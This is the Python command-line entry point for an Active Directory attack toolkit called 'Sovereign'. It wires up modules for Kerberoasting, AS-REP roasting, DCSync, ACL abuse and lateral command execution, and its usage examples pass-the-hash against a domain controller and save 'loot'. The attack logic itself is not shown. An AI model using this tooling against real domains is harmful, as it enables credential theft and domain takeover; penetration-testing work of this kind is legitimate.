"""Command-line interface for Sovereign."""

from __future__ import annotations

import argparse
import textwrap
from pathlib import Path

from sovereign.config import COMMAND, TOOL_NAME, VERSION
from sovereign.logger import log
from sovereign.models import AttackResult, EngagementContext
from sovereign.modules import (
    ACLAbuseModule, ASREPRoastModule, DCsyncModule,
    EnumModule, KerberoastModule, LateralModule,
)
from sovereign.output import dump_results, print_banner, print_legal
from sovereign.utils.ldap_helpers import domain_to_dn

MODULE_REGISTRY = {
    "enum": (EnumModule, lambda a: {}),
    "kerberoast": (KerberoastModule, lambda a: {"output_file": (a.output.replace(".json", "_krb.txt") if a.output else "")}),
    "asreproast": (ASREPRoastModule, lambda a: {"output_file": (a.output.replace(".json", "_asrep.txt") if a.output else "")}),
    "dcsync": (DCsyncModule, lambda a: {"target_user": a.dcsync_user, "output_file": (a.output.replace(".json", "_ntds") if a.output else "")}),
    "acl-abuse": (ACLAbuseModule, lambda a: {"target_user": a.acl_target, "abuse_right": a.acl_right}),
    "lateral": (LateralModule, lambda a: {"target": a.target, "command": a.command}),
}


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=COMMAND, description=f"{TOOL_NAME} v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(f"""\
            examples:
              {COMMAND} --dc-ip 10.0.0.1 --domain corp.local -u admin -p Pass --modules enum
              {COMMAND} --dc-ip 10.0.0.1 --domain corp.local -u user -p pass --modules kerberoast
              {COMMAND} --dc-ip 10.0.0.1 --domain corp.local --modules asreproast --users users.txt
              {COMMAND} --dc-ip 10.0.0.1 --domain corp.local -u Admin --hashes LM:NT --modules dcsync
              {COMMAND} --dc-ip 10.0.0.1 --domain corp.local -u Admin --hashes LM:NT --modules lateral --target 10.0.0.5
              {COMMAND} --dc-ip 10.0.0.1 --domain corp.local -u user -p pass --modules all -o loot.json
        """),
    )
    p.add_argument("--dc-ip", required=True)
    p.add_argument("--domain", required=True)
    p.add_argument("-u", "--username", default="")
    p.add_argument("-p", "--password", default="")
    p.add_argument("--hashes", default="", help="LM:NT")
    p.add_argument("--modules", nargs="+",
                   choices=["enum", "kerberoast", "asreproast", "dcsync", "acl-abuse", "lateral", "all"],
                   default=["enum"])
    p.add_argument("--target", default="")
    p.add_argument("--command", default="whoami /all")
    p.add_argument("--users", default="")
    p.add_argument("--acl-target", default="")
    p.add_argument("--acl-right", default="auto",
                   choices=["auto", "genericall", "addmember", "forcechangepassword", "writespn", "writedacl"])
    p.add_argument("--dcsync-user", default="")
    p.add_argument("--output", "-o")
    p.add_argument("--yes", "-y", action="store_true")
    p.add_argument("--version", action="version", version=f"{TOOL_NAME} v{VERSION}")
    return p


def main() -> int:
    args = build_parser().parse_args()
    print_banner()
    if not print_legal(args.yes):
        print("Aborted.")
        return 1

    lm_hash = nt_hash = ""
    if args.hashes and ":" in args.hashes:
        lm_hash, nt_hash = args.hashes.split(":", 1)

    ctx = EngagementContext(
        dc_ip=args.dc_ip, domain=args.domain,
        username=args.username, password=args.password,
        lm_hash=lm_hash, nt_hash=nt_hash,
        base_dn=domain_to_dn(args.domain),
    )

    if args.users and Path(args.users).exists():
        ctx.loot["asrep_accounts"] = Path(args.users).read_text().splitlines()

    modules_to_run = list(MODULE_REGISTRY.keys()) if "all" in args.modules else args.modules

    for mod_name in modules_to_run:
        entry = MODULE_REGISTRY.get(mod_name)
        if not entry:
            continue
        if mod_name == "lateral" and not args.target:
            log("--target required for lateral module", "WARN")
            continue
        mod_cls, kwargs_fn = entry
        log(f"Running module: {mod_name.upper()}", "INFO")
        try:
            mod = mod_cls()
            results = mod.run(ctx, **kwargs_fn(args))
            ctx.results.extend(results)
        except Exception as exc:
            log(f"Module {mod_name} error: {exc}", "ERR")
            ctx.results.append(AttackResult(mod_name, "run", "FAILED", notes=str(exc)))

    dump_results(ctx, args.output)
    return 0
